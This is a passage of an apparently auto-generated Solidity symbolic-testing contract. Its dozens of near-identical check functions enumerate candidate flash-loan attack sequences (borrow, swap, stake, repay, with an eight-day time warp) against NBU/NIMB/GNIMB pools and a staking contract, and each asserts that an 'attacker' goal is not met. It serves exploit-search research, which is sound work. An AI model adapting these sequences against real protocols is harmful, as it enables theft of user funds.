        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2090(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2091(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2092(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2093(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2094(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2095(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2096(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2097(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2098(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2099(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2100(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2101(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2102(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2103(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2104(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2105(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2106(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2107(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2108(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2109(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2110(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2111(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2112(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2113(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2114(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2115(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2116(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2117(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2118(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2119(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2120(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2121(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2122(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2123(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
